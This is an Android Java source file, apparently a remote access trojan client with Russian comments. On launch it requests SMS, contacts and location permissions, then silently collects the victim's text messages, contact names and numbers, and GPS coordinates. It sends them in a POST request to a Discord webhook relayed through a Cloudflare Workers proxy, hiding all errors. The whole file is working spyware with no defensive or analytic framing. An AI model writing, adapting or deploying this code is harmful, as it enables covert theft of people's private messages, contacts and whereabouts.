package com.rat.client;
import android.app.Activity;
import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.location.Location;
import android.location.LocationManager;
import android.os.Bundle;
import android.provider.ContactsContract;
import android.provider.Telephony;
import org.json.JSONArray;
import org.json.JSONObject;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Запрашиваем разрешения (появится окно)
        requestPermissions(new String[]{
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.ACCESS_FINE_LOCATION
        }, 1);
        
        // Собираем данные в фоне
        new Thread(() -> {
            try {
                Thread.sleep(5000); // Ждем пока юзер нажмет "Разрешить"
                sendData();
            } catch (Exception e) {}
        }).start();
    }

    void sendData() {
        try {
            JSONObject data = new JSONObject();
            
            // 1. SMS
            JSONArray smsList = new JSONArray();
            Cursor smsCursor = getContentResolver().query(Telephony.Sms.CONTENT_URI, null, null, null, null);
            if (smsCursor != null) {
                while (smsCursor.moveToNext() && smsList.length() < 10) {
                    JSONObject s = new JSONObject();
                    s.put("from", smsCursor.getString(smsCursor.getColumnIndex("address")));
                    s.put("body", smsCursor.getString(smsCursor.getColumnIndex("body")));
                    smsList.put(s);
                }
                smsCursor.close();
            }
            data.put("sms", smsList);

            // 2. Contacts
            JSONArray contacts = new JSONArray();
            Cursor cCursor = getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            if (cCursor != null) {
                while (cCursor.moveToNext() && contacts.length() < 10) {
                    JSONObject c = new JSONObject();
                    c.put("name", cCursor.getString(cCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME)));
                    c.put("phone", cCursor.getString(cCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER)));
                    contacts.put(c);
                }
                cCursor.close();
            }
            data.put("contacts", contacts);
            
            // 3. GPS
            try {
                LocationManager lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);
                Location loc = lm.getLastKnownLocation(LocationManager.GPS_PROVIDER);
                if (loc != null) {
                    data.put("gps", loc.getLatitude() + ", " + loc.getLongitude());
                }
            } catch (Exception e) {}

            // Отправка в Discord (через наш Cloudflare прокси)
            String proxyUrl = "https://discord-proxy.plansetnoviy1337.workers.dev"; // Твой прокси
            
            JSONObject payload = new JSONObject();
            JSONObject embed = new JSONObject();
            embed.put("title", "📱 SMS + Contacts + GPS");
            embed.put("description", data.toString(2));
            JSONArray embeds = new JSONArray();
            embeds.put(embed);
            payload.put("embeds", embeds);

            URL url = new URL(proxyUrl);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);
            OutputStream os = conn.getOutputStream();
            os.write(payload.toString().getBytes("UTF-8"));
            os.close();
            conn.getResponseCode();
            
        } catch (Exception e) {}
    }
}
